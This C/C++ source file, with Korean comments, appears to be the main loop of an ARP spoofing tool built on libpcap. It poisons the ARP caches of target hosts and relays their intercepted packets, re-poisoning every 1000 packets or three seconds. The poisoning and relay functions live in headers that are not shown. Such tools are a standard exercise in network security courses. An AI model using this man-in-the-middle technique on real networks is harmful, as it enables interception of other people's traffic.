#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <string.h>
#include <pcap.h>
#include <stdlib.h> 
#include "arp.h"
#include "eth.h"
#include "ip.h"
#include "tcp.h"
#include "mac_addr.h"
#include "err.h"

int main(int argc, char *argv[]){
    char* name = argv[1];
    ip_collection collete[argc/2];
    pcap_t* pcap;

    pcap = ReturnPcap(argc, name); //초반 오류 처리 + pcap 오류처리까지 한번에
    
    makecollet(collete,pcap, argc,argv, name); //argv 받은 값들 배열로 구조체 배열로 만들어서 활용하기
    infect(collete, pcap, (argc - 2) / 2, name); // 시작 1회

    size_t cnt = 0;
    struct timespec last_poison;
    clock_gettime(CLOCK_MONOTONIC, &last_poison);

    auto elapsed_ms = [](const struct timespec& a, const struct timespec& b)->long {
        return (b.tv_sec - a.tv_sec) * 1000L + (b.tv_nsec - a.tv_nsec) / 1000000L;
    };

    const size_t REINFECT_EVERY_PKTS = 1000;  // 패킷 1000개 릴레이마다 재감염
    const long   REINFECT_EVERY_MS   = 3000;  // 또는 3초마다 재감염(둘 중 하나 충족 시)

    for (;;) {
        // receiveandsend는 내부에서 약 200ms 동작 후 리턴(기존 로직 유지)
        size_t processed = receiveandsend(pcap, collete, (argc-2)/2, name);
        cnt += processed;

        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (cnt >= REINFECT_EVERY_PKTS || elapsed_ms(last_poison, now) >= REINFECT_EVERY_MS) {
            infect(collete, pcap, (argc - 2) / 2, name);
            cnt = 0;
            last_poison = now;
        }

        // 절대 sleep 하지 말 것: 릴레이가 멈춘다.
    }
}
